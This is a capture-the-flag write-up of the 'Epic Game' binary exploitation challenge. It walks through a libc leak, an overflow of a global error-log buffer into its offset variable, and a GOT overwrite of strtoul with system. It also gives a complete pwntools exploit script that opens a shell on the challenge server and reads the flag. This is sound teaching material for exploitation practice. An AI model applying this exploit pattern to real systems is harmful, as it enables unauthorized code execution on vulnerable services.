#  Epic Game

The description for this challenge is as follows:

*I created a cmd mode for WoW
but I suspect you can't win :(
can you check my game?*

*May the cyber spirit be ever in your favor!!*

*good luck (you'll need it for sure)*

*Connect: nc epic_game.ichsa.ctf.today 8007*

*challenge author: Yaakov Cohen*

The challenge was worth 350 points, so it was reasonably difficult. It had a total of 20 solves.

**TL;DR Solution:** Note that the value it gives you for "luck" actually gives you a libc leak. Fill up the error log by repeatedly giving it lengthy, non-numeric answers when prompted for input. By being careful about what you overwrite the global curr with, you can get an arbitrary overwrite. Overwrite the GOT table appropriately to win.

So, nothing particularly interesting seems to come up when we play the game. It appears that the target of the number of points needed to win is completely unachievable through normal play, since the number is high and we lose quickly.
```
ubuntu@ubuntu1804:~/CTF/ICHSA/ctfd$ ./app.out 
Hello epic warrior, it's time to begin your quest

Choose your character:
	1 - Mighty warrior
	2 - Wizard        
	3 - Elf           

Your Choice:
1
Choose your character name (limit to 12 chars)
Your Choice:
aaaaaa%x
Hello aaaaaa%x The Mighty Warrior!!!
Your health is 1000 pt.
Your shield is 100 pt.
Your strength is 500 pt.
Your lucky number is 140070531347648
You will need 2147483647 points to get the flag
Good luck, the kingdom trust you!!

You meet a Dragon!!!
aaaaaa%x
choose your move:
1 - hit 
2 - protect
3 - run

Your Choice:
1
R.I.P aaaaaa%x The Mighty Warrior
You were a brave warrior but not enough to get a flag
```
When we run checksec on the binary, we see that there is no PIE, and there is only partial RELRO, which means we should be able to overwrite GOT entries later.
```
knittingirl@piglet:~/CTF/ICHSA_CTF/ctfd$ checksec app.out
[*] '/home/knittingirl/CTF/ICHSA_CTF/ctfd/app.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
When we look at the source code, we notice some interesting features of the program. That high "lucky number" that is displayed is set to the value of rand function, but since the function is not called, it ends up being set to the value of the rand() in libc. As a result, we have a libc leak immediately with no effort.
```
uint64_t luck = rand;
```
I also noticed that whenever the game asked for user input, it would process it with lines of code like this:
```
printf("Choose your character name (limit to %d chars)\n", NAME_MAX_SIZE);
    puts("Your Choice:");

    if(fgets (buffer, BUFFER_SIZE, stdin) != NULL) {
        buffer[BUFFER_SIZE-1] = '\x00';
        str_length = strlen(buffer);
        if (str_length > 0 && str_length <= NAME_MAX_SIZE+1){
            memcpy(current_player.name, buffer, str_length-1);
        }else{
            log_error(buffer);
            memcpy(current_player.name, buffer, NAME_MAX_SIZE);
        }
    }
```
In that example, BUFFER_SIZE is equal to 0x40, while NAME_MAX_SIZE is 12. I decided that this structure had to exist for a reason, and investigated the log_error function further.
```
/**log vars**/
char error_log[1024] = {0};
uint64_t write_to_log = 0;
uint64_t curr = 0;
/************/

void log_error(char* buff)
{
    puts("Input Error\n");
    if(write_to_log)
    {
        curr += snprintf(error_log+curr, sizeof(error_log)-curr, "%s", buff);
        if (curr == sizeof(error_log))
        {
           write_to_log = false;
           //TODO: write the log buffer to file  
        }
    }
}
```
When we write input that triggers the log_error condition, our input ends up getting written to a global variable called error_log. The global variable curr is iterated up by the length of whatever we wrote to error_log, and the location of each write is the address of the beginning of error_log plus the value in curr. The write_to_log variable is an effort to keep us from writing out of bounds; however, it will only work if I allow curr to be set to exactly 1024, or 0x400, which is very easy to avoid by simply overshooting it. 

Even better, it looks likork e the global variables should be arranged in the order of error_log, write_to_log, and curr. We can confirm this with Ghidra:
```
                             error_log                                       XREF[2]:     Entry Point(*), 
                                                                                          log_error:00401374(*)  
        004040c0                 undefine   ??
                             write_to_log                                    XREF[8]:     Entry Point(*), 
                                                                                          log_error:00401346(*), 
                                                                                          log_error:0040134d(R), 
                                                                                          log_error:004013c3(*), 
                                                                                          log_error:004013c3(*), 
                                                                                          log_error:004013ca(W), 
                                                                                          main:0040157a(*), 
                                                                                          main:00401581(W)  
        004044c0                 undefined8 ??
                             curr                                            XREF[11]:    Entry Point(*), 
                                                                                          log_error:00401355(*), 
                                                                                          log_error:0040135c(R), 
                                                                                          log_error:0040136a(*), 
                                                                                          log_error:00401371(R), 
                                                                                          log_error:0040139a(*), 
                                                                                          log_error:004013a1(R), 
                                                                                          log_error:004013a7(*), 
                                                                                          log_error:004013ae(W), 
                                                                                          log_error:004013b1(*), 
                                                                                          log_error:004013b8(R)  

```
This means that I can overflow the error_log into curr. If I can control the value in curr, then I can effectively do an arbitrary overwrite, since the next call of log_error will write my text into the address pointed to by error_log address + curr. 

Since we can overwrite GOT entries, that seems like the obvious choice for our arbitrary write. I did run onegadget on the provided libc and found some potentially promising candidates; however, I noticed that the function strtoul is called when processing the user's selection of their next move, on the provided user input. This means that if I use the libc leak from earlier to set the GOT entry of strtoul to system, I can call system("/bin/sh") and get a shell.
```
puts(current_player.name);
            puts("choose your move:\n" \
            "1 - hit \n" \
            "2 - protect\n" \
            "3 - run\n");

            memset(buffer, 0x00, BUFFER_SIZE);

            puts("Your Choice:");

            if(fgets (buffer, BUFFER_SIZE, stdin) != NULL) {
                uint32_t move = strtoul(buffer, NULL, 10);
```
The final payload is below; the offsets to achieve the overwrite of curr and get the correct values to hit the GOT were finessed with guesswork and GDB/GEF use during the competition, but you could also work out the exact numbers numerically.
```
from pwn import * 

#target = process('./app.out', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "\nb *log_error+100\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\n set disassembly-flavor intel\ncontinue")

target = remote('epic_game.ichsa.ctf.today', 8007)

libc = ELF('libc.so.6')

#gadgets:
curr = p64(0x004044c8)
write_to_log = p64(0x004044c0)
error_log = p64(0x004040c0)


print(target.recvuntil(b'Your Choice:'))

#It will just pick my player type at random.
#I am already starting to send it information that will fill error_log to reduce my interactions with the server.

target.sendline(b'a' * 0x3e)

print(target.recvuntil(b'Choose your character name (limit to 12 chars)'))

target.sendline(b'a' * 0x3e)

print(target.recvuntil(b'number is '))
result = target.recvuntil(b'You')

leak = result.replace(b'\nYou', b'')
print('leak is', hex(int(leak)))

rand_libc = int(leak)

libc_base = rand_libc - libc.symbols['rand']

system_libc = libc_base + libc.symbols['system']


for i in range(15):
	
	print(target.recvuntil(b'Your Choice:', timeout=1))
	target.sendline(b'a' * 0x3b)

print(target.recvuntil(b'Your Choice:', timeout=1))

padding = b'a' * 6
curr_payload = padding

#\x49 gets puts
#\x51 is strlen
#\xa9 is strtoul
curr_payload += b'\xa9' + b'\xff' * 7 
#This is setting the value in curr, which controls where my next write goes
target.sendline(curr_payload)

#This is setting the GOT entry for strtoul to system
print(target.recvuntil(b'Your Choice:', timeout=1))
target.sendline(p64(system_libc))

#When strtoul is called on our input, we get system(/bin/sh) instead!
print(target.recvuntil(b'Your Choice:', timeout=1))
target.sendline(b'/bin/sh\x00')

target.interactive()

```
And the result against the live server looked like this:

```
knittingirl@piglet:~/CTF/ICHSA_CTF/ctfd$ python3 epic_game_payload.py 
[+] Opening connection to epic_game.ichsa.ctf.today on port 8007: Done
[*] '/home/knittingirl/CTF/ICHSA_CTF/ctfd/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b"Hello epic warrior, it's time to begin your quest\n\nChoose your character:\n\t1 - Mighty warrior\n\t2 - Wizard        \n\t3 - Elf           \n\nYour Choice:"
b'\nInput Error\n\nChoose your character name (limit to 12 chars)'
b'\nYour Choice:\nInput Error\n\nHello aaaaaaaaaaaa The Wizard!!!\nYour health is 1200 pt.\nYour shield is 400 pt.\nYour strength is 200 pt.\nYour lucky number is '
leak is 0x7f6df4616ef0
b' will need 2147483647 points to get the flag\nGood luck, the kingdom trust you!!\n\nYou meet a Evil snake!!!\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
b'\nInput Error\n\naaaaaaaaaaaa\nchoose your move:\n1 - hit \n2 - protect\n3 - run\n\nYour Choice:'
[*] Switching to interactive mode

$ ls
app.out  flag.txt
$ cat flag.txt
ICHSA_CTF{Th3_cyb3r_5p1r1t_0f_luck_I5_s7r0ng_w17h_y0u}[*] Got EOF while reading in interactive
$  

```
